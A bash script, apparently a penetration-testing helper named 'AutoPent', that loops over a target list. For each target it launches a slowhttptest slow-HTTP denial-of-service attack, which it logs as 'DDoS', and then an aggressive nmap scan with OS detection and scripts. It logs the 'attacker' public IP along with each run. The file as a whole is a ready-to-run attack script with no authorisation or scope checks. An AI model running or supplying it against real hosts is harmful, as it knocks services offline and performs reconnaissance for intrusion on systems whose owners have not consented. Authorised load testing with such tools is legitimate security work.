#!/bin/bash

# Load configurations
source config/slowhttp.sh
source config/nmap.sh

# Create logs directory if it doesn't exist
mkdir -p logs/slowhttp logs/nmap

# Get attacker's public IPv4
attacker_ip=$(curl -s ifconfig.me || hostname -I | awk '{print $1}')
attacker_ipv4=$(curl -4 -s ifconfig.me || dig -4 +short myip.opendns.com @resolver1.opendns.com) # Public IP address (IPv4)

# Function to log time
log_time() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $2" | tee -a "$1"
}

# Loop through each target in the array
for target_url in "${targets[@]}"; do
    TIMESTAMP=$(date '+%Y%m%d_%H%M%S')
    
    # Generate log filenames for each target
    target_safe=$(echo "$target_url" | sed 's|https\?://||;s|/|_|g') # Remove 'http(s)://' and replace '/' with '_'
    SLOWHTTP_LOG="logs/slowhttp/${target_safe}_slowhttp_$TIMESTAMP.txt"
    NMAP_LOG="logs/nmap/${target_safe}_nmap_$TIMESTAMP.txt"

    ### PHASE 1: SlowHTTPTest Attack ###
    log_time "$SLOWHTTP_LOG" "### PHASE 1: SlowHTTPTest Attack ###"
    log_time "$SLOWHTTP_LOG" "Starting AutoPent SlowHTTPTest attack on $target_url..."
    log_time "$SLOWHTTP_LOG" "Type-Attack  : \"$test_type\""
    log_time "$SLOWHTTP_LOG" "Target       : \"$target_url\""
    log_time "$SLOWHTTP_LOG" "From         : \"$attacker_ip\""
    log_time "$SLOWHTTP_LOG" "             : \"$attacker_ipv4\""
    log_time "$SLOWHTTP_LOG" "Attack of    : DDoS"
    log_time "$SLOWHTTP_LOG" "Time-Start   : \"$(date '+%Y-%m-%d %H:%M:%S')\""

    # Remove empty lines before executing attack
    awk 'NF' "$SLOWHTTP_LOG" > temp_log && mv temp_log "$SLOWHTTP_LOG"

    # Run SlowHTTPTest
    slowhttptest -c "$connections" "$test_type" -r "$request_rate" \
        -w "$read_timeout" -y "$write_timeout" \
        -n "$num_requests" -z "$header_size" \
        -u "$target_url" -t "$http_method" \
        -i "$interval" -x "$body_size" \
        -p "$probe_interval" -o "$output_prefix" \
        $enable_graph -l "$attack_duration" 2>&1 | awk 'NF' | tee -a "$SLOWHTTP_LOG"

    log_time "$SLOWHTTP_LOG" "Time-End     : \"$(date '+%Y-%m-%d %H:%M:%S')\""
    log_time "$SLOWHTTP_LOG" "SlowHTTPTest DONE ✅"
    echo "--------------------------------------------------------------------------"

    ### PHASE 2: Nmap Scan ###
    log_time "$NMAP_LOG" "### PHASE 2: Nmap Scan ###"
    log_time "$NMAP_LOG" "Starting AutoPent Nmap scan on $target_url..."
    log_time "$NMAP_LOG" "Scan-Type    : \"$nmap_scan_type\""
    log_time "$NMAP_LOG" "Target       : \"$target_url\""
    log_time "$NMAP_LOG" "From         : \"$attacker_ip\""
    log_time "$NMAP_LOG" "             : \"$attacker_ipv4\""
    log_time "$NMAP_LOG" "Time-Start   : \"$(date '+%Y-%m-%d %H:%M:%S')\""

    # Remove empty lines before executing scan
    awk 'NF' "$NMAP_LOG" > temp_log && mv temp_log "$NMAP_LOG"

    # Run Nmap scan
    nmap $nmap_scan_type $nmap_ports $nmap_timing $nmap_host_discovery \
        $nmap_output "$NMAP_LOG" $nmap_scripts $nmap_traceroute \
        $nmap_aggressive $nmap_os_detection $nmap_ipv6 $nmap_no_dns \
        "$target_url" 2>&1 | tee -a "$NMAP_LOG"

    log_time "$NMAP_LOG" "Time-End     : \"$(date '+%Y-%m-%d %H:%M:%S')\""
    log_time "$NMAP_LOG" "Nmap Scan DONE ✅"
    echo "--------------------------------------------------------------------------"

done

echo "✅ AutoPent attack completed. Logs saved in 'logs/' directory."
